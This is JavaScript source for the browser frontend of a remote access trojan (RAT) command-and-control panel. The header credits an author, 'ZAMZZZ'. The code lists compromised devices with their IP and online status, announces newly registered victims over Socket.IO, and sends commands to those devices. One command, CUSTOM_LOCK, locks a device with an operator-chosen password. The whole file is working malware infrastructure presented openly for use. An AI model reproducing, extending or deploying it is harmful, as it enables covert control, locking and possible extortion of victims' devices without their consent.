// =============================================
// SCRIPT: RAT CONTROLLER - FRONTEND
// VERSION: 2.0
// AUTHOR: ZAMZZZ
// =============================================

// ==================== SOCKET.IO ====================
const socket = io();

// ==================== ELEMENTS ====================
const deviceGrid = document.getElementById('devicesGrid');
const toast = document.getElementById('toast');
const notificationSound = new Audio('/static/sounds/notif.mp3');

// ==================== TOAST NOTIFICATION ====================
function showToast(message, type = 'info') {
    if (!toast) return;
    
    const colors = {
        success: '#22c55e',
        error: '#ef4444',
        info: '#a855f7',
        warning: '#f59e0b'
    };
    
    toast.textContent = message;
    toast.style.borderColor = colors[type] || colors.info;
    toast.style.display = 'block';
    toast.className = 'toast show';
    
    // PLAY SOUND
    try { notificationSound.play(); } catch(e) {}
    
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => { toast.style.display = 'none'; }, 500);
    }, 4000);
}

// ==================== UPDATE DEVICE STATUS ====================
function updateDeviceStatus(deviceId, status) {
    const card = document.querySelector(`.card[data-device-id="${deviceId}"]`);
    if (card) {
        const statusEl = card.querySelector('.status');
        if (statusEl) {
            statusEl.textContent = status;
            statusEl.className = `status ${status}`;
        }
    }
}

// ==================== FETCH DEVICES ====================
function fetchDevices() {
    fetch('/api/devices')
        .then(res => res.json())
        .then(devices => {
            if (deviceGrid) {
                // UPDATE UI
                const cards = deviceGrid.querySelectorAll('.card');
                const deviceIds = Object.keys(devices);
                
                // HAPUS CARD YANG SUDAH TIDAK ADA
                cards.forEach(card => {
                    const id = card.dataset.deviceId;
                    if (!deviceIds.includes(id)) {
                        card.remove();
                    }
                });
                
                // TAMBAH CARD BARU
                deviceIds.forEach(id => {
                    const device = devices[id];
                    let card = document.querySelector(`.card[data-device-id="${id}"]`);
                    if (!card) {
                        card = createDeviceCard(id, device);
                        deviceGrid.appendChild(card);
                    } else {
                        updateDeviceCard(card, device);
                    }
                });
            }
        })
        .catch(err => {
            console.error('Failed to fetch devices:', err);
        });
}

// ==================== CREATE DEVICE CARD ====================
function createDeviceCard(deviceId, device) {
    const card = document.createElement('div');
    card.className = 'card';
    card.dataset.deviceId = deviceId;
    
    card.innerHTML = `
        <div class="device-name">${device.name || 'Unknown'}</div>
        <div class="device-id">ID: ${deviceId.substring(0, 12)}...</div>
        <div class="device-info">
            <span>IP: ${device.ip || 'N/A'}</span>
            <span class="status ${device.status || 'offline'}">${device.status || 'offline'}</span>
        </div>
        <div class="device-info" style="font-size:11px; color:#6b5b7b;">
            Last seen: ${device.last_seen || 'Never'}
        </div>
        <a href="/device/${deviceId}" class="btn-control">🎮 Control</a>
    `;
    
    return card;
}

// ==================== UPDATE DEVICE CARD ====================
function updateDeviceCard(card, device) {
    const nameEl = card.querySelector('.device-name');
    const statusEl = card.querySelector('.status');
    const ipEl = card.querySelector('.device-info span');
    const lastSeenEl = card.querySelector('.device-info:last-child');
    
    if (nameEl) nameEl.textContent = device.name || 'Unknown';
    if (statusEl) {
        statusEl.textContent = device.status || 'offline';
        statusEl.className = `status ${device.status || 'offline'}`;
    }
    if (ipEl) ipEl.textContent = `IP: ${device.ip || 'N/A'}`;
    if (lastSeenEl) lastSeenEl.textContent = `Last seen: ${device.last_seen || 'Never'}`;
}

// ==================== SEND COMMAND ====================
function sendCommand(deviceId, command, data = {}) {
    if (!deviceId) {
        showToast('❌ Device ID required!', 'error');
        return;
    }
    
    showToast(`📨 Sending: ${command}`, 'info');
    
    fetch(`/api/device/${deviceId}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command, data })
    })
    .then(res => res.json())
    .then(res => {
        if (res.success) {
            showToast(`✅ Command ${command} sent!`, 'success');
        } else {
            showToast(`❌ Failed: ${res.error || 'Unknown error'}`, 'error');
        }
    })
    .catch(err => {
        showToast(`❌ Network error: ${err.message}`, 'error');
    });
}

// ==================== DEVICE CONTROL PAGE ====================
function setupDeviceControl(deviceId) {
    const commands = document.querySelectorAll('.ctrl-card');
    
    commands.forEach(cmd => {
        cmd.addEventListener('click', function() {
            const command = this.dataset.command;
            if (command) {
                sendCommand(deviceId, command);
            }
        });
    });
}

// ==================== CUSTOM LOCK MODAL ====================
function showLockModal() {
    const modal = document.getElementById('lockModal');
    if (modal) modal.classList.add('active');
}

function closeLockModal() {
    const modal = document.getElementById('lockModal');
    if (modal) modal.classList.remove('active');
}

function sendCustomLock(deviceId) {
    const password = document.getElementById('lockPassword');
    if (!password || !password.value) {
        showToast('❌ Masukkan password!', 'error');
        return;
    }
    
    sendCommand(deviceId, 'CUSTOM_LOCK', { password: password.value });
    closeLockModal();
    password.value = '';
}

// ==================== SOCKET EVENTS ====================
socket.on('connect', function() {
    console.log('✅ Connected to RAT Server');
    showToast('✅ Connected to RAT Server', 'success');
});

socket.on('device_registered', function(data) {
    console.log('📱 Device registered:', data);
    showToast(`📱 Device ${data.device_id} registered!`, 'success');
    fetchDevices();
});

socket.on('new_command', function(data) {
    console.log('📨 New command:', data);
    showToast(`📨 Command received: ${data.command.command}`, 'info');
    updateDeviceStatus(data.device_id, 'online');
});

socket.on('disconnect', function() {
    console.log('❌ Disconnected from RAT Server');
    showToast('❌ Disconnected from RAT Server', 'error');
});

// ==================== AUTO REFRESH ====================
let refreshInterval = setInterval(fetchDevices, 5000);

// ==================== KEYBOARD SHORTCUTS ====================
document.addEventListener('keydown', function(e) {
    // ESC = CLOSE MODAL
    if (e.key === 'Escape') {
        closeLockModal();
    }
});

// ==================== DARK MODE TOGGLE ====================
function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    const isDark = document.body.classList.contains('dark-mode');
    localStorage.setItem('darkMode', isDark);
    showToast(isDark ? '🌙 Dark Mode ON' : '☀️ Dark Mode OFF', 'info');
}

// ==================== LOAD DARK MODE PREFERENCE ====================
if (localStorage.getItem('darkMode') === 'true') {
    document.body.classList.add('dark-mode');
}

// ==================== EXPOSE FUNCTIONS ====================
window.sendCommand = sendCommand;
window.showLockModal = showLockModal;
window.closeLockModal = closeLockModal;
window.sendCustomLock = sendCustomLock;
window.toggleDarkMode = toggleDarkMode;
window.fetchDevices = fetchDevices;

// ==================== INIT ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔥 RAT Controller Ready!');
    fetchDevices();
});
